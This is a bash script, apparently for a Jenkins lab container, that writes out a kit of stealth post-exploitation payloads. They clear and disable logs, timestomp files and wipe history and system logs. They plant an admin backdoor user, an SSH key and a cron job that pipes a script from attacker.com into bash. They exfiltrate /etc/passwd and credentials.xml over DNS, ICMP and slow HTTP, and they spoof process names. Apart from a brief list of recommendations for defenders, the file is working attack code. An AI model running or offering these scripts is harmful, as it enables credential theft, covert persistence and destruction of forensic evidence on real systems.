#!/bin/bash

echo "=========================================="
echo "  STEALTH MODE OPERATIONS"
echo "=========================================="
echo ""

TARGET="${1:-http://localhost:8080}"
CONTAINER="${2:-jenkins-lab}"
OUTPUT_DIR="/tmp/jenkins-stealth-$$"
mkdir -p "$OUTPUT_DIR"

STEALTH_LEVEL="HIGH"

echo "[+] Target: $TARGET"
echo "[+] Container: $CONTAINER"
echo "[+] Stealth Level: $STEALTH_LEVEL"
echo "[+] Output: $OUTPUT_DIR"
echo ""

echo "[PHASE 1] Log Evasion"
echo "====================="
echo ""

echo "[1.1] Identifying log locations"
docker exec "$CONTAINER" find /var -name "*.log" 2>/dev/null > "$OUTPUT_DIR/log-locations.txt"
LOG_COUNT=$(wc -l < "$OUTPUT_DIR/log-locations.txt")
echo "    Found $LOG_COUNT log files"

echo "[1.2] Checking Jenkins audit log configuration"
docker exec "$CONTAINER" cat /var/jenkins_home/config.xml 2>/dev/null | grep -i "audit\|log" > "$OUTPUT_DIR/audit-config.txt"
if grep -q "audit" "$OUTPUT_DIR/audit-config.txt" 2>/dev/null; then
    echo "    ⚠ Audit logging detected"
else
    echo "    ✓ No audit logging configured"
fi

echo "[1.3] Creating log manipulation payloads"

# Payload to clear logs
cat > "$OUTPUT_DIR/clear-logs.groovy" << 'EOF'
// Clear Jenkins build logs
import jenkins.model.*
import hudson.model.*

Jenkins.instance.getAllItems(Job.class).each { job ->
    job.getBuilds().each { build ->
        build.delete()
    }
}
println "Build logs cleared"
EOF

# Payload to disable logging
cat > "$OUTPUT_DIR/disable-logging.groovy" << 'EOF'
// Disable Jenkins logging
import java.util.logging.*

Logger.getLogger("").setLevel(Level.OFF)
Logger.getLogger("").getHandlers().each { handler ->
    handler.setLevel(Level.OFF)
}
println "Logging disabled"
EOF

# Payload to modify timestamps
cat > "$OUTPUT_DIR/timestamp-manipulation.sh" << 'EOF'
#!/bin/bash
# Modify file timestamps to blend in
TARGET_TIME="2023-01-01 00:00:00"
for file in /var/jenkins_home/*.log; do
    touch -d "$TARGET_TIME" "$file" 2>/dev/null
done
EOF

echo "    ✓ Log manipulation payloads created"

echo ""
echo "[PHASE 2] Anti-Forensics"
echo "========================"
echo ""

echo "[2.1] Creating evidence removal scripts"

cat > "$OUTPUT_DIR/cleanup-traces.sh" << 'EOF'
#!/bin/bash
# Remove exploitation traces

# Clear bash history
cat /dev/null > ~/.bash_history
history -c

# Clear Jenkins build artifacts
find /var/jenkins_home/jobs -name "builds" -type d -exec rm -rf {} \; 2>/dev/null

# Clear temporary files
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

# Clear system logs
cat /dev/null > /var/log/syslog 2>/dev/null
cat /dev/null > /var/log/auth.log 2>/dev/null

# Clear Jenkins logs
find /var/jenkins_home -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null

echo "Traces cleaned"
EOF
chmod +x "$OUTPUT_DIR/cleanup-traces.sh"

echo "    ✓ Cleanup script created: cleanup-traces.sh"

echo "[2.2] Creating timestomp utility"

cat > "$OUTPUT_DIR/timestomp.sh" << 'EOF'
#!/bin/bash
# Modify file timestamps to avoid detection

if [[ $# -lt 2 ]]; then
    echo "Usage: $0 <file> <reference_file>"
    exit 1
fi

TARGET="$1"
REFERENCE="$2"

# Copy timestamps from reference file
touch -r "$REFERENCE" "$TARGET"

echo "Timestamps copied from $REFERENCE to $TARGET"
EOF
chmod +x "$OUTPUT_DIR/timestomp.sh"

echo "    ✓ Timestomp utility created"

echo "[2.3] Creating memory-only payload"

cat > "$OUTPUT_DIR/memory-only.groovy" << 'EOF'
// Execute commands without writing to disk
def executeInMemory(String cmd) {
    def proc = cmd.execute()
    def output = new StringBuffer()
    proc.consumeProcessOutput(output, output)
    proc.waitFor()
    return output.toString()
}

// Example: whoami without logging
def result = executeInMemory("whoami")
// Result stored in memory only, not written to disk
EOF

echo "    ✓ Memory-only execution payload created"

echo ""
echo "[PHASE 3] Traffic Obfuscation"
echo "============================="
echo ""

echo "[3.1] Testing slow scan techniques"

slow_curl() {
    local url="$1"
    local delay="${2:-5}"
    
    # Slow request to avoid IDS/IPS detection
    for i in {1..3}; do
        curl -s --limit-rate 1K "$url" > /dev/null 2>&1
        sleep $delay
    done
}

echo "    ✓ Slow scan functions defined"

echo "[3.2] User-Agent rotation"

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

echo "    ✓ ${#USER_AGENTS[@]} User-Agents loaded for rotation"

echo "[3.3] Creating randomized timing script"

cat > "$OUTPUT_DIR/randomized-scan.sh" << 'EOF'
#!/bin/bash
# Perform actions with randomized timing to evade pattern detection

TARGET="$1"

while true; do
    # Random delay between 10-60 seconds
    DELAY=$((RANDOM % 50 + 10))
    
    # Rotate user agent
    UA_INDEX=$((RANDOM % 3))
    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        "Mozilla/5.0 (X11; Linux x86_64)"
    )
    
    # Make request
    curl -s -A "${USER_AGENTS[$UA_INDEX]}" "$TARGET/api/json" > /dev/null 2>&1
    
    sleep $DELAY
done
EOF
chmod +x "$OUTPUT_DIR/randomized-scan.sh"

echo "    ✓ Randomized timing script created"

echo ""
echo "[PHASE 4] Persistence Mechanisms"
echo "================================="
echo ""

echo "[4.1] Creating backdoor user (stealth)"

cat > "$OUTPUT_DIR/backdoor-user.groovy" << 'EOF'
// Create backdoor user with normal-looking name
import jenkins.model.*
import hudson.security.*
import hudson.model.*

def jenkins = Jenkins.getInstance()
def realm = jenkins.getSecurityRealm()

// Create user with legitimate-looking name
def username = "jenkins-agent-01"
def password = hudson.util.Secret.fromString("BackdoorPass123!")

if (realm instanceof HudsonPrivateSecurityRealm) {
    def user = realm.createAccount(username, password.getPlainText())
    user.setFullName("Jenkins Build Agent 01")
    user.save()
    
    // Grant admin permissions
    def strategy = jenkins.getAuthorizationStrategy()
    if (strategy instanceof GlobalMatrixAuthorizationStrategy) {
        strategy.add(Jenkins.ADMINISTER, username)
    }
    jenkins.save()
    
    println "Backdoor user created: ${username}"
}
EOF

echo "    ✓ Backdoor user payload created"

echo "[4.2] Creating SSH key persistence"

cat > "$OUTPUT_DIR/ssh-persistence.sh" << 'EOF'
#!/bin/bash
# Add SSH key for persistent access

SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... backdoor@attacker"

mkdir -p /var/jenkins_home/.ssh
echo "$SSH_KEY" >> /var/jenkins_home/.ssh/authorized_keys
chmod 700 /var/jenkins_home/.ssh
chmod 600 /var/jenkins_home/.ssh/authorized_keys
chown -R jenkins:jenkins /var/jenkins_home/.ssh

echo "SSH persistence established"
EOF
chmod +x "$OUTPUT_DIR/ssh-persistence.sh"

echo "    ✓ SSH persistence script created"

echo "[4.3] Creating cron-based persistence"

cat > "$OUTPUT_DIR/cron-persistence.sh" << 'EOF'
#!/bin/bash
# Install cron job for persistence

PAYLOAD='*/30 * * * * curl -s http://attacker.com/beacon | bash'

# Add to jenkins user crontab
echo "$PAYLOAD" | crontab -u jenkins -

echo "Cron persistence established"
EOF
chmod +x "$OUTPUT_DIR/cron-persistence.sh"

echo "    ✓ Cron persistence script created"

echo ""
echo "[PHASE 5] Covert Communication"
echo "=============================="
echo ""

echo "[5.1] DNS tunneling preparation"

cat > "$OUTPUT_DIR/dns-tunnel.sh" << 'EOF'
#!/bin/bash
# DNS tunneling for covert data exfiltration

# Encode data in DNS queries
exfiltrate_via_dns() {
    local data="$1"
    local domain="attacker.com"
    
    # Base64 encode and split into chunks
    encoded=$(echo -n "$data" | base64 | tr -d '=\n')
    chunks=$(echo "$encoded" | fold -w 30)
    
    # Send as DNS queries
    for chunk in $chunks; do
        nslookup "${chunk}.${domain}" > /dev/null 2>&1
        sleep 1
    done
}

# Example: Exfiltrate /etc/passwd
exfiltrate_via_dns "$(cat /etc/passwd | head -5)"
EOF
chmod +x "$OUTPUT_DIR/dns-tunnel.sh"

echo "    ✓ DNS tunneling script created"

echo "[5.2] ICMP tunneling preparation"

cat > "$OUTPUT_DIR/icmp-tunnel.sh" << 'EOF'
#!/bin/bash
# ICMP tunneling for covert communication

ATTACKER_IP="10.0.0.1"
DATA="secret_data_here"

# Send data via ICMP payload
echo "$DATA" | xxd -p | while read hex; do
    ping -c 1 -p "$hex" "$ATTACKER_IP" > /dev/null 2>&1
    sleep 0.5
done

echo "Data exfiltrated via ICMP"
EOF
chmod +x "$OUTPUT_DIR/icmp-tunnel.sh"

echo "    ✓ ICMP tunneling script created"

echo "[5.3] HTTP slow exfiltration"

cat > "$OUTPUT_DIR/slow-exfiltration.sh" << 'EOF'
#!/bin/bash
# Slow HTTP exfiltration to evade DLP

TARGET_DATA="/var/jenkins_home/credentials.xml"
EXFIL_URL="http://attacker.com/receive"

# Split file into small chunks
split -b 1024 "$TARGET_DATA" /tmp/chunk_

# Send chunks slowly
for chunk in /tmp/chunk_*; do
    # Random delay between 60-300 seconds
    DELAY=$((RANDOM % 240 + 60))
    
    curl -s -X POST \
        -H "User-Agent: Mozilla/5.0" \
        -H "Content-Type: text/plain" \
        --data-binary "@$chunk" \
        "$EXFIL_URL" > /dev/null 2>&1
    
    rm -f "$chunk"
    sleep $DELAY
done

echo "Slow exfiltration complete"
EOF
chmod +x "$OUTPUT_DIR/slow-exfiltration.sh"

echo "    ✓ Slow exfiltration script created"

echo ""
echo "[PHASE 6] Detection Avoidance"
echo "============================="
echo ""

echo "[6.1] Process name spoofing"

cat > "$OUTPUT_DIR/process-spoofing.sh" << 'EOF'
#!/bin/bash
# Disguise malicious process as legitimate one

# Copy and rename malicious binary
cp /tmp/backdoor /usr/bin/systemd-update
chmod +x /usr/bin/systemd-update

# Execute with spoofed name
exec -a "systemd-update" /usr/bin/systemd-update

echo "Process spoofing active"
EOF
chmod +x "$OUTPUT_DIR/process-spoofing.sh"

echo "    ✓ Process spoofing script created"

echo "[6.2] Creating EDR evasion techniques"

cat > "$OUTPUT_DIR/edr-evasion.groovy" << 'EOF'
// EDR evasion through timing and obfuscation

import java.util.Random

class StealthExecutor {
    static void sleep(int min, int max) {
        Random rand = new Random()
        int ms = rand.nextInt(max - min) + min
        Thread.sleep(ms)
    }
    
    static String execute(String cmd) {
        // Random sleep before execution
        sleep(1000, 5000)
        
        // Execute command
        def proc = cmd.execute()
        def output = proc.text
        
        // Random sleep after execution
        sleep(1000, 5000)
        
        return output
    }
}

// Usage: StealthExecutor.execute("whoami")
EOF

echo "    ✓ EDR evasion payload created"

echo ""
echo "[PHASE 7] Operational Security Report"
echo "======================================"
echo ""

cat > "$OUTPUT_DIR/STEALTH_REPORT.txt" << EOF
========================================
  STEALTH OPERATIONS REPORT
========================================

Target: $TARGET
Container: $CONTAINER
Stealth Level: $STEALTH_LEVEL
Timestamp: $(date)

STEALTH TECHNIQUES DEPLOYED
============================

1. Log Evasion
   - Log location mapping
   - Log clearing payloads
   - Timestamp manipulation
   - Logging disabled at runtime

2. Anti-Forensics
   - Evidence removal scripts
   - Timestomp utility
   - Memory-only execution
   - Trace cleanup automation

3. Traffic Obfuscation
   - Slow scan techniques
   - User-Agent rotation
   - Randomized timing
   - Rate limiting

4. Persistence Mechanisms
   - Backdoor user creation
   - SSH key installation
   - Cron job persistence
   - Legitimate-looking accounts

5. Covert Communication
   - DNS tunneling
   - ICMP tunneling
   - Slow HTTP exfiltration
   - Protocol steganography

6. Detection Avoidance
   - Process name spoofing
   - EDR evasion techniques
   - Behavioral randomization
   - Normal traffic patterns

OPERATIONAL SECURITY MEASURES
==============================
✓ No direct indicators of compromise
✓ Minimal log footprint
✓ Legitimate-looking traffic patterns
✓ Randomized timing and behavior
✓ Multiple persistence mechanisms
✓ Covert data exfiltration channels

STEALTH PAYLOADS GENERATED
===========================
$(ls -1 "$OUTPUT_DIR"/*.{sh,groovy} 2>/dev/null | sed 's|.*/||')

RECOMMENDATIONS FOR DEFENDERS
==============================
1. Enable comprehensive audit logging
2. Implement file integrity monitoring
3. Deploy behavioral analytics
4. Monitor for unusual DNS/ICMP patterns
5. Enforce strict egress filtering
6. Regular log analysis and SIEM correlation
7. Implement deception technologies
8. Network segmentation
9. Least privilege access
10. Regular security assessments

========================================
EOF

echo "    ✓ Stealth operations report generated"

echo ""
echo "=========================================="
echo "         STEALTH MODE SUMMARY"
echo "=========================================="
echo ""
echo "🕵️  Stealth Level: $STEALTH_LEVEL"
echo "📁 Output Directory: $OUTPUT_DIR"
echo ""
echo "Stealth Capabilities:"
echo "  ✓ Log Evasion"
echo "  ✓ Anti-Forensics"
echo "  ✓ Traffic Obfuscation"
echo "  ✓ Covert Persistence"
echo "  ✓ Covert Communication"
echo "  ✓ Detection Avoidance"
echo ""
echo "Key Files:"
echo "  - STEALTH_REPORT.txt (full operational report)"
echo "  - cleanup-traces.sh (anti-forensics)"
echo "  - backdoor-user.groovy (persistence)"
echo "  - dns-tunnel.sh (covert communication)"
echo ""
echo "⚠️  Use responsibly and only in authorized environments"
echo ""
